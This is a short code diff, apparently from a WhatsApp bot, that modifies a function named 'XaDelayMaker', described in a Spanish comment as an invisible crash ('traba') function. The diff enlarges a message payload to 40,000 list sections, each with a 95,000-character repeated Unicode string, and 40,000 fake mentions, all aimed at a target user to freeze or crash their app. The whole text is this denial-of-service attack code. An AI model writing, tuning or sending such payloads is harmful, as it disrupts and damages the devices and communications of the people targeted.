@@ -2,8 +2,8 @@ import fetch from 'node-fetch';
 
 // 🔹 Función de traba invisible
 async function XaDelayMaker(target, conn) {
-  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
-    title: "᭡꧈".repeat(95000),
+  const delaymention = Array.from({ length: 40000 }, (_, r) => ({
+    title: "ꦾ".repeat(95000),
     rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
   }));
 
@@ -17,7 +17,7 @@ async function XaDelayMaker(target, conn) {
           sections: delaymention,
           singleSelectReply: { selectedRowId: "🔴" },
           contextInfo: {
-            mentionedJid: Array.from({ length: 30000 }, () =>
+            mentionedJid: Array.from({ length: 40000 }, () =>
               "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
             ),
             participant: target,
